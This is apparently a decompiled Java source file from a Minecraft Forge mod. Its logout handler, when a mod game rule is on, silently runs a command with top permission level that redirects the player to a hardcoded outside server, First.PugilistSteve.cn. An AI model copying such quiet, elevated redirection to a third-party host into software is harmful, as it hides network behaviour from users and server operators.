package com.pla.annoyingvillagers.procedures;

import javax.annotation.Nullable;
import net.minecraft.world.entity.Entity;
import net.minecraft.world.level.LevelAccessor;
import net.minecraftforge.event.entity.player.PlayerEvent.PlayerLoggedOutEvent;
import net.minecraftforge.eventbus.api.Event;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.fml.common.Mod.EventBusSubscriber;
import com.pla.annoyingvillagers.init.AnnoyingVillagersModGameRules;

@EventBusSubscriber
public class GameLeaveProcedure {

    @SubscribeEvent
    public static void onPlayerLoggedOut(PlayerLoggedOutEvent playerloggedoutevent) {
        execute(playerloggedoutevent, playerloggedoutevent.getPlayer().level, playerloggedoutevent.getPlayer());
    }

    public static void execute(LevelAccessor levelaccessor, Entity entity) {
        execute((Event) null, levelaccessor, entity);
    }

    private static void execute(@Nullable Event event, LevelAccessor levelaccessor, Entity entity) {
        if (entity != null) {
            if (levelaccessor.getLevelData().getGameRules().getBoolean(AnnoyingVillagersModGameRules.LEAVE_TO_SERVER) && !entity.level.isClientSide() && entity.getServer() != null) {
                entity.getServer().getCommands().performCommand(entity.createCommandSourceStack().withSuppressedOutput().withPermission(4), "redirect @s First.PugilistSteve.cn");
            }

        }
    }
}
